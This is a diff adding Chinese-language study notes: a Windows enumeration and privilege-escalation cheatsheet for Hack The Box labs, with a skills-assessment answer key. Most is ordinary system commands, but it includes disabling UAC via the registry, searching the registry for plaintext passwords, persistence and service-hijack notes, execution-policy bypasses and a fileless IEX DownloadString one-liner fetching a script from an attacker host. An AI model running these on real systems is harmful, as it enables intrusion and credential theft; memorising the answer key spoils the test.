@@ -1,0 +1,477 @@
+================================================================================
+【Windows 實戰枚舉、搜尋與系統偵察速查 Cheatsheet】
+================================================================================
+
+一、 檔案搜尋與內容過濾 (CMD / PowerShell)
+--------------------------------------------------------------------------------
+指令/參數              原始英文完整單字            白話功能與設計邏輯
+--------------------------------------------------------------------------------
+dir                   directory                   列出當前目錄內容
+  - /s                subdirectories              遞迴搜尋子目錄：往下遍歷所有層級資料夾
+  - /b                bare format                 極簡裸模式：僅印出完整檔案路徑，方便複製過濾
+  - /ah (或 /a:h)     attribute: hidden           屬性過濾：只列出具備隱藏屬性的檔案與資料夾
+
+findstr               find string                 文字搜尋工具（類似 Linux grep）
+  - /s                subdirectories              在目前目錄及所有子目錄的檔案中進行搜尋
+  - /i                ignore case                 忽略大小寫：不分大小寫比對字串
+  - /n                number                      顯示行號：輸出符合字串所在檔案中的行號
+
+where                 where                       搜尋執行檔路徑（類似 Linux which）
+  - /R                recurse                     遞迴指定路徑：從特定根目錄往下搜尋符合的檔案
+
+tree                  directory tree              以樹狀圖顯示目錄結構
+  - /F                files                       展開檔案：除了資料夾外，連同裡面的檔案一併列出
+  - /A                ASCII                       純字元模式：改用標準 ASCII 字元繪製樹狀圖，防止亂碼
+
+Get-ChildItem         Get Child Item              PowerShell 檔案與目錄列舉 cmdlet
+  - -Recurse          Recurse                     遞迴遍歷子目錄
+  - -Filter           Filter                      指定檔案比對條件（如 *.log, *.txt）
+  - -ErrorAction      Error Action                設定錯誤處理策略（搭配 SilentlyContinue 可忽略權限錯誤）
+
+Select-String         Select String               PowerShell 文字內容搜尋 cmdlet（支援正規表達式）
+  - -Pattern          Pattern                     指定欲比對搜尋的字串規則或樣式
+  - -Path             Path                        指定要進行內容搜尋的檔案路徑
+
+
+二、 當前使用者與特權偵察 (Whoami)
+--------------------------------------------------------------------------------
+指令/參數              原始英文完整單字            白話功能與設計邏輯
+--------------------------------------------------------------------------------
+whoami                who am I                    檢視當前已登入或取得 Shell 的使用者帳號
+  - /priv             privileges                  特權清單：檢視 Token 具備的權限（如 SeImpersonate、SeBackup）
+  - /groups           groups                      群組清單：檢視當前帳號隸屬的所有安全性群組
+  - /all              all                         完整傾印：一次輸出帳號 SID、隸屬群組及所有 Token 特權狀態
+
+
+三、 系統與網路環境枚舉 (Host & Network)
+--------------------------------------------------------------------------------
+指令/參數              原始英文完整單字            白話功能與設計邏輯
+--------------------------------------------------------------------------------
+systeminfo            system information          印出作業系統名稱、核心版本號、Hotfix 修補清單與硬體架構
+route print           route print                 印出本機路由表與介面清單
+ipconfig /all         IP configuration all        完整列出所有網路卡之 IP、子網路遮罩、Gateway 與 DNS
+
+netstat               network statistics          監控本機所有 TCP/UDP 網路通訊協定與連接埠狀態
+  - -a                all                         所有連線：顯示所有已連線以及正在 Listening 的連接埠
+  - -n                numerical                   數字顯示：不進行反向 DNS 解析，直接顯示 IP:Port，速度最快
+  - -o                owning process ID           顯示 PID：顯示佔用該連接埠的程序識別碼，方便後續追查
+
+tasklist              task list                   列出目前系統正在執行的所有前景與背景程序
+  - /v                verbose                     詳細資訊：顯示執行程序的執行身分（User Name）與視窗標題
+  - /svc              services                    關聯服務：顯示各個 svchost.exe 內載入的 Windows 服務名稱
+
+
+四、 本地帳號與服務枚舉 (Net & Service Controller)
+--------------------------------------------------------------------------------
+指令/參數              原始英文完整單字            白話功能與設計邏輯
+--------------------------------------------------------------------------------
+net user              net user                    列出主機上所有的本地使用者帳號
+net user [使用者名稱]  net user [username]         查詢特定使用者的詳細設定（密碼是否過期、上次登入時間等）
+net localgroup        net local group             列出主機上所有的本地群組名稱
+net localgroup        local group administrators  管理員清單：直接列出本機管理者群組（Administrators）的所有成員
+administrators
+
+sc                    service controller          Windows 系統服務管理與控制核心指令
+  - qc                query configuration         查詢服務配置：檢視服務啟動類型與執行檔路徑（BINARY_PATH_NAME）
+  - query             query                       查詢指定服務當前運作狀態（RUNNING / STOPPED）
+
+
+五、 網路除錯與原生通訊檢測 (Netcat / PowerShell Network)
+--------------------------------------------------------------------------------
+指令/參數              原始英文完整單字            白話功能與設計邏輯
+--------------------------------------------------------------------------------
+nc                    netcat                      網路除錯與通訊測試工具（網路瑞士刀）
+  - -l                listen                      監聽模式：本機作為伺服端（Server）等待連線
+  - -p                port                        指定連接埠：設定本機要監聽或連線的通訊埠編號
+  - -v                verbose                     詳細輸出：輸出連線建立與除錯訊息
+  - -n                numeric-only                純數字模式：不作 DNS 解析，加快測試反應速度
+  - -u                UDP                         UDP 協定：切換為 UDP 連線測試（預設為 TCP）
+  - -z                zero-I/O                    探測模式：僅確認連接埠連通性，不傳送資料立即中斷
+
+Test-NetConnection    Test Net Connection         PowerShell 網路連線診斷指令（常用簡稱 tnc）
+  - -Port             Port                        指定欲測試目標主機是否開放之通訊埠編號
+
+Get-NetTCPConnection  Get Net TCP Connection      PowerShell 本地 TCP 連線狀態查詢工具
+  - -State Listen     State Listen                過濾狀態：僅列出處於監聽（Listen）狀態的連線
+  - -LocalPort        Local Port                  指定過濾本地特定通訊埠編號
+
+
+================================================================================
+【心智圖解】Windows 註冊表（Registry）實體化架構與打靶重點
+================================================================================
+
+┌─────────────────────────────────────────────────────────────┐
+│          Windows 註冊表 (中央設定總檔案櫃 Registry)         │
+│          → 存放全系統所有開關、設定與軟體規則的資料庫       │
+└──────────────────────────────┬──────────────────────────────┘
+                               │
+       ┌───────────────────────┴───────────────────────┐
+       ▼                                               ▼
+┌──────────────────────────────┐        ┌──────────────────────────────┐
+│  【個人專屬抽屜】            │        │  【全電腦共用抽屜】          │
+│  HKEY_CURRENT_USER (HKCU)    │        │  HKEY_LOCAL_MACHINE (HKLM)   │
+├──────────────────────────────┤        ├──────────────────────────────┤
+│ ‧存放「當前登入者」個人設定 │        │ ‧存放「整台電腦」底層規則   │
+│ ‧例如：桌面壁紙、個人捷徑   │        │ ‧例如：防毒、驅動、全域安全 │
+│ ‧換人登入就會切換抽屜       │        │ ‧任何人登入都必須遵守       │
+└──────────────────────────────┘        └──────────────┬───────────────┘
+                                                       │
+                                      (深入安全政策子目錄 System Policies)
+                                                       │
+                                                       ▼
+                                        ┌──────────────────────────────┐
+                                        │  【關鍵安全開關 便條紙】     │
+                                        │  鍵值名稱：EnableLUA         │
+                                        │  (即 UAC 使用者帳戶控制)     │
+                                        ├──────────────────────────────┤
+                                        │ ‧資料型態：REG_DWORD        │
+                                        │ ‧預設啟用：0x1 (開關打開)   │
+                                        │ ‧打靶關閉：0x0 (開關關閉)   │
+                                        └──────────────────────────────┘
+
+
+六、 檔案櫃抽屜分類 (五大 Hive 根機碼)
+--------------------------------------------------------------------------------
+抽屜名稱 (英文代號)        實體生活比喻            系統實際存放內容
+--------------------------------------------------------------------------------
+HKEY_CURRENT_USER        【員工個人置物櫃】      當前登入使用者的個人化設定（桌面壁紙、
+(HKCU)                                          軟體介面偏好、個人路徑）。換人就換櫃。
+
+HKEY_LOCAL_MACHINE       【大樓公用設備間】      全電腦共用設定（硬體驅動、網路設定、
+(HKLM)                                          系統安全原則）。誰來都得用這套。
+
+HKEY_USERS               【全體員工總名冊】      這台主機上所有帳號的設定原型。
+(HKU)                                           (HKCU 其實只是對應到這裡的某一頁)。
+
+HKEY_CLASSES_ROOT        【公文格式對照表】      檔案副檔名關聯（.txt 用記事本開、
+(HKCR)                                          .pdf 用瀏覽器開、捷徑圖示等）。
+
+HKEY_CURRENT_CONFIG      【當天開機狀態表】      電腦當次開機時，硬體裝置的即時配置。
+(HKCC)
+
+
+七、 抽屜裡的便條紙格式 (常用資料型態 Data Types)
+--------------------------------------------------------------------------------
+型態名稱 (Type)           便條紙格式              實務內容與範例
+--------------------------------------------------------------------------------
+REG_DWORD                【是非題 / 數字格】     32 位元整數。專門用來控制開關：
+                                                ‧ 0x0 (停用 / 關閉)
+                                                ‧ 0x1 (啟用 / 開啟)
+                                                [例] EnableLUA (UAC 開關)
+
+REG_SZ                   【單行文字格】          純文字字串，只能寫一行文字。
+                                                [例] 某程式安裝路徑 C:\App\run.exe
+
+REG_EXPAND_SZ            【變數文字格】          可展開環境變數的文字。
+                                                [例] %SystemRoot%\System32 會自動
+                                                     被解讀為 C:\Windows\System32
+
+REG_MULTI_SZ             【條列式清單格】        多重文字字串，可以在同一格內放
+                                                多行獨立文字或順序清單。
+                                                [例] 系統啟動要依序載入的驅動清單
+
+
+八、 實戰打靶與高頻提權弱點（靶機最常出現的破綻）
+--------------------------------------------------------------------------------
+1. 停用 UAC 開關（背景繞過彈窗限制）：
+   ‧ 查詢數值：
+     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+   ‧ 修改數值（強制寫入 0x0）：
+     reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+2. AlwaysInstallElevated（以最高 SYSTEM 權限安裝 MSI 安裝檔）：
+   ‧ 兩個鍵值皆必須為 1 / 0x1 才生效：
+     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+3. Autorun / Startup 啟動項可寫入弱點（Persistence 留後門或劫持）：
+   ‧ 查詢自動啟動程式路徑：
+     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+     reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+4. 註冊表中殘留的明文憑證（Credential Harvesting）：
+   ‧ 在註冊表中遞迴搜尋 "password" 關鍵字（縮小至 SOFTWARE 提高效率）：
+     reg query HKLM\SOFTWARE /f password /t REG_SZ /s
+     reg query HKCU\SOFTWARE /f password /t REG_SZ /s
+================================================================================
+
+================================================================================
+【打靶實戰筆記：Windows 服務權限（Service Permissions）與提權核心】
+================================================================================
+
+一、 核心觀念：服務背後的「帳號身分」與「執行路徑」
+--------------------------------------------------------------------------------
+1. 服務執行帳號 (Log On As)：
+   ‧ LocalSystem (SYSTEM)：本機最高權限（打靶最愛，提權目標）。
+   ‧ NetworkService / LocalService：低權限服務帳號（符合最小特權原則）。
+   ‧ 專用服務帳號 (Service Accounts)：企業正規做法，避免綁定個人管理員帳號。
+
+2. 兩大高危險服務設定漏洞：
+   ‧ 檔案可覆寫：服務以 SYSTEM 執行，但其 .exe 檔案所在的資料夾允許低權限寫入。
+   ‧ 崩潰恢復劫持 (Recovery Action)：服務設定「第一次故障時自動執行某程式」，
+     該路徑若被竄改，服務當掉時就會自動以高權限觸發惡意程式。
+
+
+二、 GUI 與命令列工具對照
+--------------------------------------------------------------------------------
+‧ 圖形介面 (GUI)：
+   執行「services.msc」打開服務管理員，可看 General、Log On、Recovery 分頁。
+
+‧ 命令列工具 (CLI - sc.exe)：
+   ‧ 查詢服務詳細配置（看路徑 BINARY_PATH_NAME 與執行身分 SERVICE_START_NAME）：
+     sc qc [服務名稱]
+     (例: sc qc FoxitReaderUpdateService)
+
+   ‧ 查詢服務即時運作狀態：
+     sc query [服務名稱]
+
+   ‧ 停止與啟動服務（測試服務或觸發重新載入）：
+     sc stop [服務名稱]
+     sc start [服務名稱]
+
+
+三、 PowerShell 自動化列舉指令（HTB 最常用）
+--------------------------------------------------------------------------------
+‧ 快速抓出所有「非微軟原生（排除 C:\Windows）」的第三方服務路徑：
+  Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike "C:\Windows\*" } | Select-Object Name, StartName, PathName
+  (註：StartName 即為該服務所使用的帳號身分，如 LocalSystem)
+================================================================================
+
+================================================================================
+【Windows 作業系統交互與環境偵察筆記 (Interacting with Windows)】
+================================================================================
+
+一、 核心概念總覽
+--------------------------------------------------------------------------------
+1. 互動途徑：
+   ‧ GUI (圖形使用者介面)：直覺但無法自動化批次處理。
+   ‧ RDP (遠端桌面協定，預設 TCP 3389)：跨網路取得遠端圖形桌面控制權。
+   ‧ CMD (命令提示字元)：傳統純文字輸出工具。
+   ‧ PowerShell：現代化自動化管理工具，輸出為「物件 (Object)」，支援別名與腳本。
+
+2. 別名機制 (Alias)：
+   ‧ 微軟為貼近 Linux 使用者習慣建立的指令對照表。
+   ‧ 輸入簡寫時，系統會在背景自動轉換並呼叫對應的完整指令或執行檔。
+
+3. 腳本執行原則 (Execution Policy)：
+   ‧ 微軟設計用來防止誤觸惡意 .ps1 腳本的安全檢查機制（非真正的安全防禦邊界）。
+   ‧ 採分層管理：包含 MachinePolicy、UserPolicy、Process、CurrentUser、LocalMachine。
+
+
+二、 常用別名 (Alias) 對照與查詢語法
+--------------------------------------------------------------------------------
+【常見內建別名對照】
+‧ ifconfig  ----->  ipconfig.exe (網卡與 IP 配置查詢)
+‧ ls        ----->  Get-ChildItem (列出檔案與目錄)
+‧ cat       ----->  Get-Content (檢視檔案文字內容)
+‧ clear     ----->  Clear-Host (清空終端畫面)
+
+【別名查詢指令 (PowerShell)】
+‧ 查詢指定別名所指向的真實指令：
+  Get-Alias ifconfig
+
+‧ 反查指定程式或 Cmdlet 的別名：
+  Get-Alias -Definition ipconfig.exe
+
+‧ 列出當前環境中所有可用別名：
+  Get-Alias
+
+
+三、 執行策略 (Execution Policy) 狀態與等級
+--------------------------------------------------------------------------------
+等級名稱            安全狀態與意義
+--------------------------------------------------------------------------------
+Restricted          全面封鎖：禁止執行任何 .ps1 腳本（系統預設）
+AllSigned           高限制：僅允許執行具備信任數位簽章的腳本
+RemoteSigned        中度限制：本機編寫腳本可直接跑，網路下載腳本需數位簽章
+Unrestricted        無限制：所有腳本均可執行，僅網路下載檔首次執行會提示
+Bypass              完全繞過：不阻擋、不檢查、不跳任何警告視窗（滲透與打靶首選）
+
+
+四、 實戰打靶情境與指令應用 (何時用？怎麼用？)
+--------------------------------------------------------------------------------
+【情境 1：確認目標主機設定與腳本權限】
+‧ 查看各層級的執行策略狀態：
+  Get-ExecutionPolicy -List
+
+【情境 2：執行提權或列舉腳本被系統阻擋時 (如 winPEAS.ps1)】
+‧ 實戰繞過法 A：單次執行直接繞過（最常用，無須管理員權限）
+  powershell.exe -ExecutionPolicy Bypass -File winPEAS.ps1
+
+‧ 實戰繞過法 B：僅放寬當前終端視窗 (Process) 權限
+  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+‧ 實戰繞過法 C：記憶體直接載入執行（無檔案落地，不受本機策略限制）
+  powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<攻擊機IP>/script.ps1')"
+================================================================================
+
+================================================================================
+【Windows 管理規範 (WMI) 架構與 WMIC 實操速查】
+================================================================================
+
+一、 WMI 核心概念
+--------------------------------------------------------------------------------
+‧ 定義：Windows 底層的集中式儀表板，負責監控硬體、軟體、服務與系統狀態。
+‧ 運作邏輯：透過「WMI 提供者」收集各元件資料，交由「WMI 服務」統整，
+  最後由管理者透過「WMIC 指令」或「PowerShell」進行調閱與操控。
+
+
+二、 終端機常用指令與輸出欄位解析
+--------------------------------------------------------------------------------
+‧ 查詢作業系統基本概況：
+  wmic os list brief
+
+‧ 欄位判讀要點：
+  - BuildNumber     : 系統組建號（打靶核心！用此號碼搜尋 LPE 提權漏洞）
+  - RegisteredUser  : 註冊登記使用者名稱
+  - Version         : 系統核心版本號
+  - SystemDirectory : 核心目錄路徑 (預設 C:\WINDOWS\system32)
+
+
+三、 打靶延伸常用 WMIC 清單
+--------------------------------------------------------------------------------
+‧ 查詢補丁修補紀錄 (Hotfix / Patches)：
+  wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+‧ 查詢防毒軟體狀態：
+  wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname
+
+‧ 查詢所有處理程序及其執行檔路徑：
+  wmic process get caption,executablepath,commandline
+================================================================================
+
+================================================================================
+【Windows Server 核心 vs. 桌面體驗 (Server Core vs. Desktop Experience)】
+================================================================================
+
+一、 Windows Server Core 特色
+--------------------------------------------------------------------------------
+‧ 無完整圖形介面 (No GUI)：開機預設僅有 CMD / PowerShell 終端視窗。
+‧ 優點：資源消耗極低、更新重開機頻率低、攻擊面大幅減少 (少了圖形組件漏洞)。
+‧ 不可逆性：Windows Server 2019 起，安裝時選了 Server Core 就無法轉回桌面版。
+‧ 打靶視角：若透過 RDP 連入只看到黑色終端畫面即為此版本，所有操作全靠指令。
+
+
+二、 Sconfig 工具 (文字版伺服器配置選單)
+--------------------------------------------------------------------------------
+‧ 呼叫指令：sconfig
+‧ 性質：微軟內建的文字化設定腳本 (VBScript/PowerShell 驅動)。
+‧ 用途：無 GUI 環境下快速設定電腦名稱、加入網域、配置 IP 與開啟 RDP 遠端管理。
+================================================================================
+
+
+================================================================================
+【使用者空間 (User)】                │ 【系統空間 (System)】
+================================================================================
+[隔離區塊 Isolation]                │ [隔離區塊 Isolation]
+  提升權限提示 (Elevation prompt)   │   提升權限提示 (Elevation prompt)
+                                    │
+                                    │        ▲
+                                    │        │ 是 (Yes)
+                                    │   ◆ 是否啟用安全桌面？ (Secure desktop enabled?)
+              否 (No)               │        │ 否 (No)
+   ◀────────────────────────────────┼────────┤
+                                    │        │
+                                    │   ◆ 是否具備微軟數位簽章且宣告靜默提權？
+                                    │     (Windows signed and manifested for silent elevation?)
+                                    │        │
+                                    │        ├── 是 (Yes) ──┐
+[隔離區塊 Isolation]                │        │              │
+  磁碟重組工具 (Defrag (Admin))     │        ├── 中 (Medium)│
+                                    │        ▼              │
+                                    │   ◆ 檢查 UAC 滑桿等級 │ (高 High)
+                                    │     (Check UAC slider level)
+                                    │        │              │
+   使用者執行需要特權的操作         │        ├── 低 (Low)   │
+   (User performs operation         │        │              │
+    requiring privilege)            │        ▼              ▼
+           │                        │   ■ 建立處理程序 (Create Process)
+           ├───▶ ■ ShellExecute ────┼─▶   ├── ■ AppCompat (應用程式相容性)
+           │           │            │     ├── ■ Fusion (組件融合/繫結)
+           │           ▼            │     └── ■ Installer Detection (安裝程式偵測)
+           │     ■ CreateProcess    │
+           │                        │   ■ Application Information Service (Appinfo 服務)
+           │                        │        ▲
+           │                        │        │ 是 (Yes)
+           │                        │   ◆ 是否為 ActiveX 安裝？ (ActiveX Install?)
+           │                        │        │ 否 (No)
+           │                        │        └──────────────────────────┘
+================================================================================
+【核心空間 (Kernel)】
+  ■ 虛擬化 (Virtualization) ───▶ ● 檔案系統與註冊表 (File system and registry)
+================================================================================
+【圖例說明 (Legend)】
+  ● 綠色節點：新增項目 (New)
+  ● 藍色節點：既有項目 (Existing)
+================================================================================
+
+
+================================================================================
+【Hack The Box: Windows Fundamentals 技能評估 (Skills Assessment) 完整解題統整】
+================================================================================
+
+一、 題目與標準答案對照表
+--------------------------------------------------------------------------------
+‧ 問題 1：公司資料共享權限 ACL 中預設存在的群組名稱是什麼？
+  [答案] Everyone
+  [解析] Windows 建立網路共用資料夾時，共用權限預設會指派給 Everyone 群組。
+
+‧ 問題 2：可以配置 NTFS 權限的選項卡名稱是什麼？
+  [答案] Security
+  [解析] 檔案或資料夾「內容（Properties）」中，負責存取權限控制（讀/寫/完全控制）
+         的分頁標籤為「Security（安全性）」。
+
+‧ 問題 3：與 Windows 更新相關的服務名稱是什麼？
+  [答案] wuauserv
+  [解析] Windows Update 的系統原生真實服務名稱為 wuauserv，顯示名稱則為
+         Windows Update，負責更新服務的底層主機處理常式為 svchost.exe。
+
+‧ 問題 4：列出與你建立的使用者帳戶 Jim 關聯的 SID[cite: 12]。
+  [答案] S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx (依靶機動態產生的完整字串)[cite: 13]
+  [步驟] 需先以管理員權限建立帳號，再查詢其安全識別碼[cite: 12, 13]。
+
+‧ 問題 5：列出與你建立的 HR 安全性群組關聯的 SID[cite: 12]。
+  [答案] S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx (依靶機動態產生的完整字串)[cite: 13]
+  [步驟] 需先以管理員權限建立群組，再查詢其安全識別碼[cite: 12, 13]。
+
+
+二、 實戰操作指令庫 (建議複製存入個人 Cheat Sheet)
+--------------------------------------------------------------------------------
+1. 提權前置建立 (需以「Run as administrator」啟動 PowerShell)[cite: 16]：
+   ‧ 建立使用者 Jim：
+     net user Jim "Password123!" /add
+   ‧ 建立本機安全性群組 HR：
+     net localgroup HR /add
+
+2. 查詢使用者與群組的 SID (Security Identifier)[cite: 14]：
+   ‧ 查詢 Jim 的 SID：
+     (Get-CimInstance Win32_UserAccount -Filter "Name = 'Jim'").SID
+     或使用 CMD 語法：
+     wmic useraccount where name='Jim' get sid
+   ‧ 查詢 HR 群組的 SID：
+     (Get-CimInstance Win32_Group -Filter "Name = 'HR'").SID
+     或使用 CMD 語法：
+     wmic group where name='HR' get sid
+
+3. 服務枚舉與資訊過濾：
+   ‧ 搜尋與 update 相關的所有服務名稱與顯示名稱：
+     Get-Service | Where-Object { $_.DisplayName -like "*update*" -or $_.Name -like "*update*" } | Select-Object Name, DisplayName
+   ‧ 調閱特定服務的詳細執行路徑 (PathName) 與狀態：
+     Get-CimInstance Win32_Service -Filter "Name = 'wuauserv'" | Select-Object Name, DisplayName, State, PathName | Format-List
+
+
+三、 踩坑覆盤與核心觀念 (不用硬背，記住原理即可)
+--------------------------------------------------------------------------------
+1. 錯誤代碼 System error 5 (Access is denied)：
+   ‧ 原因：當前終端機僅為一般權限，Windows UAC 機制阻擋變更安全性資料庫[cite: 16]。
+   ‧ 解法：搜尋 PowerShell 點右鍵「Run as administrator」取得高權限 Token 再執行[cite: 16]。
+
+2. GUI 顯示名稱 vs 底層系統真名：
+   ‧ 圖形介面看到的「Windows Update」是 DisplayName。
+   ‧ 指令操作與 API 呼叫的「wuauserv」才是真正的 Service Name。
+
+3. SID (安全識別碼) 的本質：
+   ‧ 格式必為 S-1-5-21-...[cite: 13, 14, 15]。
+   ‧ Windows 內部不認「Jim」或「HR」這類字串，所有權限判斷（Token、ACL）
+     底層一律比對這串唯一的 SID[cite: 12, 14, 15]。
+================================================================================
